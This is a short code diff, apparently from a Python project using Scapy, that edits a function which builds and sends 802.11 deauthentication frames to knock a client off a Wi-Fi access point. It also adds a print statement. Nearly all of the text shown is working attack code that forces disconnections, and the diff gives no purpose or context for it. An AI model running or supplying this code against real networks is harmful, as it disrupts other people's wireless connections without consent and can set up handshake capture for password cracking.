@@ -12,10 +12,11 @@ def check_deauth(pkt):
     deauth(pkt[Dot11].addr1, pkt[Dot11].addr2)
 
 
-def deauth(iface: str, wifi: Wifi, client: str, reason: int = 7):
+def deauth(iface: str, BSSID: str, client: str, reason: int = 7):
     packet = RadioTap() / \
-        Dot11(type=0, subtype=12, addr1=client, addr2=wifi.BSSID, addr3=wifi.BSSID) / \
+        Dot11(type=0, subtype=12, addr1=client, addr2=BSSID, addr3=BSSID) / \
         Dot11Deauth(reason=reason)
+    print(f'SENDING DEAUTH to {BSSID}')
     sendp(packet, iface=iface)
 
 
